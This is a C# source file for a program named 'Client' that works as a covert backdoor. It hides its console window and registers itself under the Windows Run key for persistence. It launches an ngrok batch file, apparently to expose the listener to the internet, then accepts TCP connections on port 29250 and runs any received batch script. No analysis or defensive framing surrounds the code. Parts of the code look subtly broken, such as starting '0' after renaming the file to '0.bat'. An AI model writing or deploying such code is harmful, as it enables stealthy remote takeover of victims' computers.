using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using static System.Net.Mime.MediaTypeNames;
using Microsoft.Win32;

namespace Client
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("User32.dll", EntryPoint = "FindWindow")]
        private static extern IntPtr FindWindowNative(string className, string windowName);

        private const int BufferSize = 1024;
        public string Status = string.Empty;
        public Thread T = null;
        private static void Main(string[] args)
        {
            ShowWindow(GetConsoleWindow(), 0);

            Program program = new Program();
            Thread T = new Thread(new ThreadStart(program.StartReceiving));

            program.SetStartup();

            T.Start();
        }

        private void SetStartup()
        {              
            RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            reg.SetValue("Client", System.Reflection.Assembly.GetExecutingAssembly().Location);
            Process.Start("ngrok.bat");
            Thread.Sleep(500);
            ShowWindow(FindWindowNative(null, "C:\\WINDOWS\\system32\\cmd.exe"), 0);
        }

        public void StartReceiving()
        {
            ReceiveTCP(29250);
        }

        public void ReceiveTCP(int portN)
        {
            TcpListener Listener = null;
            try
            {
                Listener = new TcpListener(IPAddress.Any, portN);
                Listener.Start();
            }
            catch
            {
            }

            byte[] RecData = new byte[BufferSize];
            int RecBytes;

            for (; ; )
            {
                TcpClient client = null;
                NetworkStream netstream = null;
                try
                {
                    if (Listener.Pending())
                    {
                        client = Listener.AcceptTcpClient();
                        netstream = client.GetStream();

                        if (File.Exists("0.bat"))
                        {
                            File.Delete("0.bat");
                        }

                        int totalrecbytes = 0;
                        FileStream Fs = new FileStream("0", FileMode.OpenOrCreate, FileAccess.Write);
                        while ((RecBytes = netstream.Read(RecData, 0, RecData.Length)) > 0)
                        {
                            Fs.Write(RecData, 0, RecBytes);
                            totalrecbytes += RecBytes;
                        }
                        Fs.Close();
                        File.Move("0", Path.ChangeExtension("0", ".bat"));
                        Process.Start("0");

                        netstream.Close();
                        client.Close();
                    }
                }
                catch
                {
                    Thread.Sleep(1000);
                }
            }
        }
    }
}
